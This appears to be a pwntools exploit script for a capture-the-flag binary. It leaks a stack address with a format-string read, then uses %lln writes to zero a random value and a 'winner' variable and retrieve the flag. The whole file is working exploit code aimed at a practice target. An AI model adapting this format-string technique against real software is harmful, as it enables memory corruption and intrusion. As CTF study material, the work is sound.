from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendline(payload)
    io.recvuntil('Hello,')
    return io.recvline()


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *0x0040139c
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './leet_test'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Start program
io = start()

# Leak address from stack
io.sendline('%{}$p'.format(38))
io.recvuntil('Hello,')
leaked_addr = int(io.recvlineS().strip(), 16)
info('leaked_addr = 0x%x (%d)', leaked_addr, leaked_addr)
# Get random number address (offset of 237 calculated in GDB)
random_num_addr = leaked_addr - 0x11f
info('random_num_addr = 0x%x (%d)', random_num_addr, random_num_addr)

# Payload to overwrite the value retrieved from /dev/urandom (in RAX)
# And winner value from .data section with zeroes so that 0x1337c0de * 0 == 0
payload = flat([
    # Format string specifiers (identified with fuzzing/pwntools)
    '%12$lln',
    '%13$llnaa',
    pack(0x404078),  # winner value (0xcafebabe) to overwrite with zero
    pack(random_num_addr)  # Random number to overwrite with zero
])

# Send payload
io.sendline(payload)

# Get our flag!
io.recvuntil('Come right in!')
flag = io.recv()
success(flag)
